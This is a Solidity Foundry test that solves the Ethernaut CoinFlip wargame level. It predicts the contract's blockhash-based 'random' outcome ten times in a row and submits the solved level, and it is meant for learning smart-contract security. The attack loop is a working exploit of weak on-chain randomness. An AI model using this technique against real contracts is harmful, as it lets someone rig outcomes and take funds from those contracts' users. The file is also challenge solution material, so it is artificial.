// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/levels/03-CoinFlipFactory.sol";
import "../src/core/Ethernaut.sol";

contract CoinFlipTest is Test {
    Ethernaut ethernaut;
    address attacker = address(1337);
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 wei);
    }

    function testCoinFlipHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        CoinFlipFactory factory = new CoinFlipFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        CoinFlip coinFlipContract = CoinFlip(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // 1. Create a loop of 10 iters
        // 2. Re-use the coin flip contract's code to get the logic for the correct side
        // This works because if we know the block number, we can utilise the same logic to get the correct flip
        for (uint256 i = 0; i < 10; i++) {
            vm.roll(i + 1);
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            coinFlipContract.flip(side);
        }

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
